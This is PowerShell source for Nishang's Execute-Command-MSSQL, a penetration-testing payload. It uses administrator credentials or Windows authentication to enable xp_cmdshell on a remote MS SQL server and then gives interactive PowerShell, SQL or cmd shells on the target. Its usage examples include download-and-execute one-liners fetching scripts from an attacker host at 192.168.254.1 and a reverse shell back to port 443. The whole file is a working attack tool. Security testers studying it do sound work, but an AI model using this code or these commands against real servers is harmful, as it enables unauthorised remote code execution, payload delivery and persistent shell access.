  function Execute-Command-MSSQL {
<#
.SYNOPSIS
Nishang payload which could be used to execute commands remotely on a MS SQL server.

.DESCRIPTION
This payload needs a valid administrator username and password on remote SQL server.
It uses the credentials to enable xp_cmdshell and provides a powershell shell, a sql shell
or a cmd shell on the target. If the WindowsAuthentication switch is used, an attempt is made to 
use the Windows Authentication. No username and password is required in such case.

.PARAMETER ComputerName
Enter CopmuterName or IP Address of the target SQL server.

.PARAMETER UserName
Enter a UserName for a SQL server administrator account.

.PARAMETER Password
Enter the Password for the account.

.PARAMETER WindowsAuthentication
Use this switch parameter to use Windows Authentication for SQL Server.

.EXAMPLE
PS> Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234

.EXAMPLE
PS> Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234

.EXAMPLE
PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234
Connecting to target...
Enabling XP_CMDSHELL...
Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): P
Starting PowerShell on the target..
PS target> iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Get-Information.ps1''));Get-Information

Use above to execute scripts on a target.

.EXAMPLE
PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234 -payload "iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Invoke-PowerShellTcp.ps1''));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443"
Use above to execute scripts on a target non-interactively.

.LINK
http://www.labofapenetrationtester.com/2012/12/command-execution-on-ms-sql-server-using-powershell.html
https://github.com/samratashok/nishang

.NOTES
Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
http://www.truesec.com

#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
        [string]
        $ComputerName,

        [parameter(Mandatory = $False, Position = 1)]
        [string]
        $UserName,
    
        [parameter(Mandatory = $False, Position = 2)]
        [string]
        $Password,

        [parameter(Mandatory = $False, Position = 3)]
        [string]
        $payload,
                
        [parameter()]
        [switch]
        $WindowsAuthentication
    )
  
    Try{
    function Make-Connection ($query)
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        if ($WindowsAuthentication -eq $True)
        {
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
        }
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        $Command.CommandText = $query
        $Reader = $Command.ExecuteReader()
        $Connection.Close()
    }
  
    "Connecting to $ComputerName..." 
    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    "`nEnabling XP_CMDSHELL...`n"
    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"

    if ($payload)
    {
        $Connection = New-Object System.Data.SQLClient.SQLConnection
        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
        if ($WindowsAuthentication -eq $True)
        {
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
        }
        $Connection.Open()
        $Command = New-Object System.Data.SQLClient.SQLCommand
        $Command.Connection = $Connection
        $cmd = "EXEC xp_cmdshell 'powershell.exe $payload'"
        $Command.CommandText = "$cmd"
        $Reader = $Command.ExecuteReader()
        while ($reader.Read()) {
            New-Object PSObject -Property @{
            Name = $reader.GetValue(0)
            }
        }
        $Connection.Close()
    }

    else
    {
        write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
        $shell = read-host
        while($payload -ne "exit")
        {
            $Connection = New-Object System.Data.SQLClient.SQLConnection
            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
            if ($WindowsAuthentication -eq $True)
            {
                $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
            }
            $Connection.Open()
            $Command = New-Object System.Data.SQLClient.SQLCommand
            $Command.Connection = $Connection
            if ($shell -eq "P")
            {
                write-host "`n`nStarting PowerShell on the target..`n"
                write-host -NoNewline "PS $ComputerName> "
                $payload = read-host
                $cmd = "EXEC xp_cmdshell 'powershell.exe -Command $payload'"
            }
            elseif ($shell -eq "S")
            {
                write-host "`n`nStarting SQL shell on the target..`n"
                write-host -NoNewline "MSSQL $ComputerName> "
                $payload = read-host
                $cmd = $payload
            }
            elseif ($shell -eq "C")
            {
                write-host "`n`nStarting cmd shell on the target..`n"
                write-host -NoNewline "CMD $ComputerName> "
                $payload = read-host
                $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
            }
            
            
            $Command.CommandText = "$cmd"
            $Reader = $Command.ExecuteReader()
            while ($reader.Read()) {
                New-Object PSObject -Property @{
                Name = $reader.GetValue(0)
                }
            }
            $Connection.Close()
        }
    }    
    
    }Catch {
        $error[0]
    }
}



